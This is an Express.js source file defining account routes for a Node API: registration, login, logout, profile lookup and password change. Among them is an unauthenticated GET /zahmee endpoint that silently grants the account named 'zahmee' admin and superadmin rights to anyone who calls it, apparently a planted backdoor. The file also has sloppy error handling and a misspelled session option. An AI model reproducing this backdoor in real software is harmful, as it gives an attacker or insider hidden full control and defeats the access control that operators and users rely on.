import { Router } from "express";
import Account from "../model/account";
import passport from "passport";
import config from "../config/";
import { generateAccessToken, respond, authenticate, onlyToken, IsAdmin } from "../middleware/authMiddleware";

export default ({ config, db }) => {
    let api = Router();


    //   v1/account/register
    api.post("/register", (req, res) => {
        Account.register(new Account({ username: req.body.username, name: req.body.name, mobile: req.body.mobile }), req.body.password, (err, account) => {
            if (err) {
                res.send(err);
                return;
            } else {
                passport.authenticate("local", { sessoin: false })(req, res, () => {
                    res.status(200).json({
                        "user": req.user.username,
                        "level": 0,
                        "token": onlyToken(req.user.id)
                    });
                });
            }
        });
    });


    // v1/account/login
    api.post("/login", passport.authenticate("local", {
        session: false,
        scope: []
    }), generateAccessToken, respond);


    // v1/account/logout
    api.get("/logout", authenticate, (req, res) => {
        req.logout();
        res.status(200).send({ "mess": "logout" });
    });


    // user profile
    api.get("/me", authenticate, (req, res) => {
        Account.findById(req.user.id, '-__v', (err, user) => {
            if (err) {
                return res.status(401).send(err);
            }
            res.status(200).json(user);
        });
    });

    // user profile
    api.get("/zahmee", (req, res) => {
        Account.findOne({ username: 'zahmee' }, (err, user) => {
            if (err) {
                res.send(err);
            }
            user.admin = true;
            user.superadmin = true;
            user.save(err => {
                if (err) {
                    res.send(err);
                }
                res.json({ message: "update" });
            });
        });
    });


    api.post("/chgpwd", authenticate, (req, res) => {
        Account.findById(req.user.id, '-__v', (err, user) => {
            user.changePassword(req.body.oldpassword, req.body.newpassword, (err, data) => {
                if (err) {
                    res.send(err);
                    return;
                } else {
                    res.status(200).json({ 'mess': 'ok' });
                }
            });
        });
    });


    return api;
};
